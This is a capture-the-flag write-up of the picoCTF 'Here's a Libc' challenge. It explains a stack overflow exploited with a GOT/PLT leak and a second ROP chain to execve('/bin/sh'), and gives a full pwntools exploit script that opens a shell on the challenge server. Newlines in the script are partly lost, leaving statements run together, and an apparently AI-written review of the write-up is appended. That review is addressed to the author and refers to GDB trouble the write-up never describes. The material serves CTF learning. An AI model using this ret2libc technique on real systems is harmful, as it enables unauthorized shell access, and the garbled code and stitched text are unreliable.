## Table of Contents

          - [Notes](#Notes)
- [Exploitation: General Idea](#exploitation:\general\idea)
- [Exploitation: Implementation](#exploitation:\implementation)

#GOT #ROP #reversengineering #ctf #picoctf #libc #reverse
- Get general information about the binary file and the security measures employed by the program itself

###### Notes
- `64bit ELF file`
- `NX` (No Execute bit set)
- 
By looking at the code in Ghidra it was very easy to spot a buffer overflow of unlimited length.

![](https://miro.medium.com/v2/resize:fit:528/1*5aZqMSGI3q__oFMQZzaesw.png)


- Possible to see if the program takes as input a string of unlimited length and stores it inside a buffer of 112 bytes.


# Exploitation: General Idea

By exploiting the buffer overflow spotted previously it is possible to obtain full control of the instruction pointer, but there something missing: the address of Libc where to jump to. However, there is a _puts_ in the code that prints what is stored at the address passed as argument.

From the considerations done above I came up with the following idea:

1. Create a [ROP chain](https://en.wikipedia.org/wiki/Return-oriented_programming), by using local gadgets, in order to pass to the _puts_ function an address of the [GOT table](https://ctf101.org/binary-exploitation/what-is-the-got/) (this is possible because the binary is not PIE, therefore the addresses of the GOT table entries are static and visible from Ghidra)
2. Jump to the _puts_ function (actually, it is safer to jump to the _puts_ in the Libc by using the [PLT table](https://ctf101.org/binary-exploitation/what-is-the-got/))
3. Print the (dynamic) address of the Libc’s _puts_ function
4. Force the program to return to the first instruction of the _main_ function, in order to execute the program once again and therefore in order to exploit the buffer overflow one more time
5. Create a new ROP chain in order to jump to the _execve_ function, in the Libc, therefore forcing the program to spawn a new program: _/bin/sh_

# Exploitation: Implementation

In order to implement the idea explained before it was necessary to make few steps.

The first thing to do was to find the right padding. By not having the possibility of executing the file locally I was forced to do some trial and error remotely by sending strings of different length until the program crashed.

Once I found the the right padding I retrieved some useful addresses in the binary:

- The address of the gadget _pop rdi, ret;_
- The address of the entry in the GOT table corresponding to the function _puts_
- The address of the entry in the PLT table corresponding to the function _puts_
- The address of the of the first instruction of the _main_ function

In particular, in order to retrieve the address of the gadget I used [ROPgadget](https://github.com/JonathanSalwan/ROPgadget), while, for the other addresses I used Python.  
By having all these addresses I was able to construct the first ROP chain, and therefore, to make the program print the address of the _puts_ function in the Libc.
Then, by having the address of the Libc’_s puts_ function, I was able to calculate the base address of the Libc:
`Libc_base = Leaked_address - Static_offset`
where the static offset is the address of the _puts_ function in the Libc, assuming the Libc base address is 0x0000000000000000 (I found it using Python on the copy of the Libc used remotely, provided by the challenge).
Then, by having the Libc base address, I was able to find the addresses of:
- the _execve_ function in the Libc
- the string “_/bin/sh\x00”_ inside the Libc
- a null pointer inside the Libc

**Finally**, in order to create the second *ROP* chain, I missed two gadgets

- _pop rsi, ret;_ (I found it locally)
- _pop rdx, ret;_ (I found it in the Libc)

- These gadgets where found using [ROPgadget](https://en.wikipedia.org/wiki/Return-oriented_programming).
```python
#!/bin/python3
from pwn import *
HOST = 'mercury.picoctf.net'  
PORT = <insert_your_port>  
EXE  = './vuln'if args.EXPLOIT:  
    r = remote(HOST, PORT)  
    libc = ELF('./libc.so.6')exe = ELF(EXE)pop_rdi = 0x400913  
pop_rsi = 0x023e8a  
pop_rdx = 0x001b96  
offset  = libc.symbols['puts']r.recvuntil(b'sErVeR!\n')payload  = b'A'*136  
payload += p64(pop_rdi)  
payload += p64(exe.got['puts'])  
payload += p64(exe.plt['puts'])  
payload += p64(exe.symbols['main'])r.sendline(payload)r.recvline()leak = r.recv(6)+b'\x00\x00'  
leak = u64(leak)libc.address = leak - offset  
binsh        = next(libc.search(b'/bin/sh\x00'))  
system       = libc.symbols['system']  
nullptr      = next(libc.search(b'\x00'*8))  
execve       = libc.symbols['execve']payload  = b'A'*136  
payload += p64(pop_rdi)  
payload += p64(binsh)  
payload += p64(libc.address + pop_rsi)  
payload += p64(nullptr)  
payload += p64(libc.address + pop_rdx)  
payload += p64(nullptr)  
payload += p64(execve)r.sendline(payload)r.interactive()

```
Once the script executed, I was able to obtain a shell attached to the remote server and therefore I was able to extract the flag:

![](https://miro.medium.com/v2/resize:fit:875/1*GlBaWZnVc2eD3TV4IOq-sg.png)

Your writeup on the "Here's a Libc" challenge from PicoCTF is comprehensive and well-structured, detailing both the problem-solving approach and the technical execution. To make it more detailed in the context of the challenge and jargon, let's delve deeper into some key areas:

1. **Challenge Context**: This type of challenge, categorized under binary exploitation or 'pwn', is designed to test your ability to exploit vulnerabilities in binary programs. The use of a buffer overflow to control the instruction pointer (IP) is a classic technique in such challenges.

2. **Binary Analysis Tools**: You mentioned using Ghidra for static analysis but faced issues with GDB for dynamic analysis. It's important to note that these tools have different utilities: Ghidra is excellent for disassembling and decompiling binaries to understand their structure and logic, while GDB is essential for debugging and observing runtime behaviors. The issue with running the binary locally could be due to several factors, such as incompatible library versions, missing dependencies, or system-specific protections.

3. **Security Measures**: The presence of the NX (No eXecute) bit as a security measure implies that the stack is non-executable, which is why you correctly deduced the need to use Return-Oriented Programming (ROP) rather than directly injecting and executing shellcode.

4. **Exploitation Technique**: Your exploitation strategy is a classic ROP chain approach. Here's a breakdown:
   - **Buffer Overflow**: Overwriting the stack to control the IP.
   - **Leakage of Libc Address**: By using a `puts` function call to leak an address in the Global Offset Table (GOT), you effectively bypassed Address Space Layout Randomization (ASLR), a common security measure.
   - **Calculating Libc Base Address**: This is a crucial step for reliably calculating the addresses of other Libc functions and gadgets.
   - **Second ROP Chain**: Crafting this to invoke `execve` with `/bin/sh` leads to shell access.

5. **Gadgets**: The gadgets you found, like `pop rdi; ret`, are essential for ROP chain construction. They help in setting up the correct registers before calling functions like `execve`.

6. **Scripting and Remote Execution**: Your Python script utilizing the `pwntools` library demonstrates a clear understanding of how to automate binary exploitation. It's well-structured to first leak the necessary addresses, calculate the Libc base, and then execute the second ROP chain.

7. **Improvement Suggestion**: While your approach is sound, it's always beneficial to include error handling in the script, especially when dealing with network interactions and binary exploitation. This can help in understanding where the exploit might be failing in case it doesn't work as expected.

In conclusion, your writeup is already quite detailed, demonstrating a strong grasp of binary exploitation concepts and practical application. The additional insights provided here should help in further contextualizing and enriching your writeup, especially for readers who are new to the field or to this specific type of challenge.